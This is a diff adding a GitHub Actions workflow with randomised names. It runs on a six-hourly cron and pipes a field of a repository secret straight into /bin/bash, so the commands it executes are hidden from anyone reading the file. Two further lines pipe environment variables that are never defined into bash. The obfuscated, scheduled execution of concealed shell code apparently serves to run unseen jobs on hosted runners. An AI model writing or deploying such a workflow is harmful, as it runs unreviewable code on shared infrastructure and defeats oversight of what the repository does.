@@ -1,0 +1,21 @@
+name: tianqiguang4567
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tianqiguang4567
+        env:
+          ou43: ${{ secrets.ou43 }}
+        run: |
+          echo $ou43 | jq -r .y95 | /bin/bash
+          echo $fmsyb28811 | jq -r .oah360 | /bin/bash
+          echo $cjoin933 | jq -r .nkiou04 | /bin/bash
+
